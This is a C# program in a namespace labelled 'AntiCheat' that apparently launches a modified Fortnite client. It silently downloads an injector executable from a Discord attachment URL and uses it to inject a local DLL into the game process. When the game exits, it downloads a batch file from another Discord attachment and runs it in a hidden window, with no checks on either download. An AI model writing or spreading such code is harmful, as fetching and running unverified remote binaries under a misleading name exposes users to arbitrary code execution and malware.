using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Reflection;

namespace AntiCheat
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            string tempPath = Path.GetTempPath();
            if (!File.Exists(tempPath + "/Inject.exe"))
            {
                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/1032986535273967696/1033439324609462362/Injector.exe", (tempPath+ "/Inject.exe"));
            }
            Console.Title = ("Atomic || dsc.gg/AtomicFN");
            Console.WriteLine("Do Not Close This Window Or Your Fortnite Will Crash\nMade by Psycho");
            Process process = Process.Start(new ProcessStartInfo("FortniteClient-Win64-Shipping.exe", Environment.CommandLine) { UseShellExecute = false, CreateNoWindow = true });
            
            process.WaitForInputIdle();
            
            string dll = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "/Dll.dll";
            new Process()
            {
                StartInfo = {

                                Arguments = string.Format("\"{0}\" \"{1}\"", (object) process.Id, (object) dll),
                                CreateNoWindow = true,
                                UseShellExecute = false,
                                FileName = ($"{tempPath}/Inject.exe")
                                }

            }.Start();

            process.WaitForExit();
            if (!File.Exists(tempPath + "/exit.bat"))
            {
                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/777557159818166282/1038174758828777572/exit.bat", tempPath + "/exit.bat");
            }
            Process.Start(new ProcessStartInfo(tempPath + "/exit.bat") { CreateNoWindow = true, WorkingDirectory = tempPath });
            

        }

    }
}

//MADE BY FOCO AND SUB TO HIM
